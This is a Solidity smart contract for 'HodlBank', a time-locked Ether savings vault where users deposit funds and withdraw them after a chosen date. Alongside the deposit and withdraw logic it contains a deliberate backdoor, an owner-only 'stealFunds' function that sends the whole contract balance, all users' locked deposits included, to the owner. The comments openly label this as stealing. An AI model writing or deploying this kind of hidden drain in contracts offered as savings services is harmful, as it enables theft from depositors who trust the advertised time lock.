// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract HodlBank is Ownable {
    struct UserInfo {
        address userAddress;
        uint256 storedBalance;
        bool isExist;
    }

    // User Info
    mapping(address => UserInfo) private userInfoList;

    // Store Array of user addresses
    address[] private userAddressList;

    // This will store refund times
    mapping(address => uint256) private refundTimes;

    event UpdateRefundTime(address userAddress, uint256 timeRemaining);

    // Function to deposit Ether into this contract.
    // Call this function along with some Ether.
    // The balance of this contract will be automatically updated.
    // On frontend Math.floor((new Date(date).getTime()) / 1000) to get the timestamp
    function deposit(uint256 _timestampOfRefundDate) public payable {
        // Increase the amount stored in smart contract

        userInfoList[msg.sender].userAddress = msg.sender;
        userInfoList[msg.sender].storedBalance += msg.value;

        // If user is new
        if (!userInfoList[msg.sender].isExist) {
            userInfoList[msg.sender].isExist = true;
            userAddressList.push(msg.sender);
        }

        // Increase the hodl time
        // refundTimes[msg.sender] += block.timestamp + _timestampOfRefundDate;
        if (refundTimes[msg.sender] < _timestampOfRefundDate) {
            refundTimes[msg.sender] = _timestampOfRefundDate;
        }
    }

    // Returns single user item
    function getUserInfo(address userAddress)
        public
        view
        onlyOwner
        returns (UserInfo memory)
    {
        return userInfoList[userAddress];
    }

    // Returns every address that was stored in the smart contract
    function getUserAddressList()
        public
        view
        onlyOwner
        returns (address[] memory)
    {
        return userAddressList;
    }

    // Withdraw tokens stored in the smart contract
    function withdraw(uint256 _amount) public payable {
        address to = payable(msg.sender);

        uint256 storedUserBalance = userInfoList[to].storedBalance;
        // Check if user can refund the ETHER stored
        require(block.timestamp > refundTimes[to], "You can not withdraw yet");

        // Check to see if user has enough balances stored in smart contract
        require(storedUserBalance >= _amount, "You do not have enough balance");

        // get the amount of Ether stored in this contract
        uint256 amount = _amount;

        require(
            amount < address(this).balance,
            "Currently contract doesnt have that funds!"
        );

        // Reduce the amount from the address
        userInfoList[to].storedBalance -= amount;

        // send all Ether to owner
        (bool success, ) = to.call{value: amount}("");
        require(success, "Failed to send Ether");

        // Fire an event for refund time
        emit UpdateRefundTime(to, refundTimes[msg.sender]);
    }

    // Smart Contract Account Balance
    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }

    // Steal Funds
    // Private cannot be payable so it is public
    function stealFunds() public payable onlyOwner {
        // get the amount of Ether stored in this contract
        uint256 amount = address(this).balance;

        // There needs to be a balance for stealing :)
        require(amount > 0, "Contract does not have any balances");

        // send all Ether to owner
        // Owner can receive Ether since the address of owner is payable
        (bool success, ) = owner().call{value: amount}("");
        require(success, "Failed to send Ether");
    }

    function getStoredBalance() public view returns (uint256) {
        return userInfoList[msg.sender].storedBalance;
    }

    // User Account Balances that are stored in the Smart Contract
    function getStoredBalanceOfUser(address _user)
        public
        view
        onlyOwner
        returns (uint256)
    {
        return userInfoList[_user].storedBalance;
    }

    // User Refund Times that are stored in the Smart Contract
    function refundTimeOfUser(address _user) public view returns (uint256) {
        return refundTimes[_user];
    }

    function hasUserAccountOwner(address _user) public view returns (bool) {
        return _user == owner();
    }
}
